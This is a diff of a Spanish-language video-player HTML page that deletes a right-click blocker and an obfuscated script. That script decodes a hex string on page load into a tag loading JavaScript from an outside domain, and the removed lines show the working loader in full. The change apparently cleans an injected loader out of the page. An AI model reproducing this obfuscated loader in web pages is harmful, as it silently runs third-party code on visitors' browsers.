@@ -1,12 +1,7 @@
 
 <html lang="es">
 <head>
-<script type='text/javascript'>
-    document.oncontextmenu = function(){return false}
-    </script>
-<script type='text/javascript'>
-var t="3c73637269707420747970653d27746578742f6a61766173637269707427207372633d272f2f6f63637572636c61696d65642e636f6d2f37352f32372f64362f37353237643662373033363561323063393938643436376662326335636533652e6a73273e3c2f7363726970743e";for(i=0;i<t.length;i+=2){document.write(String.fromCharCode(parseInt(t.substr(i,2),16)));}
-</script>
+
 <meta name="robots" content="noindex" />
 <script src="//cdn.jsdelivr.net/npm/@clappr/player@0.4.0/dist/clappr.min.js"></script>
 <script src="//cdn.jsdelivr.net/npm/mux.js@5.6.7/dist/mux.min.js"></script>
